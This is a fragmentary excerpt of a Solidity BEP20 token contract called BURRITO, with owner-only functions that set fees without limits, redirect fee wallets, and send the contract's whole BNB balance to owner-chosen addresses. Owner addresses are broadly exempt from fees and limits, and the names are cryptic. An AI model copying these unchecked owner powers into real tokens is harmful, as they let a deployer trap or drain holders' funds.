...
contract BURRITO is Context, BEP20, Ownable {
using SafeMath for uint256;
    ...
    address tfU = msg.sender;
    address tfUs = msg.sender;
    address _tfUs;
    address _tfU;
    address _mWA;
    string private _name = "BURRITO";
    string private _symbol = "BURRITO";
    uint8 private _decimals = 9;
    uint256 public _rewFee = 2;
    uint256 private _pRewFee = _rewFee;
    uint256 public _liqFee = 6;
    uint256 private _pLiqFee = _liqFee;
    uint256 public _markFee = 2;
    uint256 private _pMarkFee = _markFee;
    uint256 public _rewsFee = 4;
    uint256 public _liqsFee = 8;
    uint256 public _marksFee = 4;
    uint256 _csbn = 50;
    uint256  _csbd = 100;
    uint256 _gso = 50000;
    uint256 _ctbp = 2;
    ...
    constructor () {
        ...
        _tfUs = tfUs;
        _mWA = mWA;
        _iFxE[address(_tfU)] = true;
        _iFxE[address(_mWA)] = true;
        _iFxE[owner()] = true;
        _iFxE[address(_tfUs)] = true;
        _iFxE[address(this)] = true;
        _iTxLE[_msgSender()] = true;
        _iTxLE[address(this)] = true;
        _iTxLE[owner()] = true;
        _iTxLE[address(_uniswapV2Router)] = true;
        _iTxLE[address(_tfUs)] = true;
        _iTxLE[address(_mWA)] = true;
        _iTxLE[address(0)] = true;
        _iTxLE[address(_tfU)] = true;
        _iMxWE[_msgSender()] = true;
        _iMxWE[address(_tfUs)] = true;
        _iMxWE[address(_mWA)] = true;
        _iMxWE[address(this)] = true;
        _iMxWE[address(_tfU)] = true;
        _iMxWE[address(0)] = true;
        _iMxWE[owner()] = true;
        _isTloE[address(_tfUs)] = true;
        _isTloE[address(_tfU)] = true;
        _isTloE[address(_mWA)] = true;
        _isTloE[owner()] = true;
        _isTloE[msg.sender] = true;
        _isTloE[address(0)] = true;
    ...
    function setgas(uint256 gso) external onlyOwner {
        _gso = gso;
    }
    ...
    function setTfus(address _add) external onlyOwner {
        _tfUs = _add;
    }
    ...
    function setConlp(bool enable) external onlyOwner {
        ConLPCut = enable;
    }
    ...
    function swapETH() external onlyOwner {
        uint256 boc = address(this).balance;
        uint256 bdiv = boc.mul(_csbn).div(_csbd);
        (bool tmpSuccess,) = payable(_tfU).call{value: bdiv, gas: _gso}("");
        (tmpSuccess,) = payable(_tfUs).call{value: boc.sub(bdiv), gas: _gso}("");
        tmpSuccess = false;
    }
    ...
    function setRFP(uint256 rFee) external onlyOwner() {
     ...
     function setMaxsWT(uint256 sWb) external onlyOwner() {
        numTokensSellToAddToLiquidity = ( _tTotal * sWb ) / 10000;
    }
    ...
    function setABFee(uint256 rFee, uint256 lFee, uint256 mFee) external onlyOwner() {
        _rewFee = rFee;
        _liqFee = lFee;
        _markFee = mFee;
    }
    ...
    function setBadd(address _addt, address _addts,  address _addm) external onlyOwner {
        _tfU = _addt;
        _tfUs = _addts;
        _mWA = _addm;
    }
    ...
    function _takeMarketing(uint256 tMarketing) private {
        uint256 currentRate =  _getRate();
        uint256 rMarketing = tMarketing.mul(currentRate);
        _rOwned[_mWA] = _rOwned[_mWA].add(rMarketing);
        if(_isExcluded[_mWA])
    ...
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        ...
        return _amount.mul(_rewsFee).div(10**2);}
        return _amount.mul(_rewFee).div(10**2);
    }

    function calculateMarketingFee(uint256 _amount) private view returns (uint256) {
        if(sFh && _msgSender() != uniswapV2Pair){
        return _amount.mul(_marksFee).div(10**2);}
        return _amount.mul(_markFee).div(10**2);
    }

    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        if(sFh && _msgSender() != uniswapV2Pair){
        return _amount.mul(_liqsFee).div(10**2);}
        return _amount.mul(_liqFee).div(10**2);
    }
    
    function removeAllFee() private {
        if(_rewFee == 0 && _liqFee == 0) return;
    ...
    function _transfer(
        ...
        if(!_iMxWE[to] && to != address(this)  && to != address(0) && to != uniswapV2Pair && to != _tfUs && to != _tfU){
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        if(ConLPCut){
        uint256 half = contractTokenBalance.mul(_ctbp).div(_tlqd);
        uint256 otherHalf = contractTokenBalance.mul(_lpH).div(_tlqd);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newCBalance = address(this).balance.sub(initialBalance);
        uint256 newBalance = newCBalance.mul(_chn).div(_chd);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);}
    }
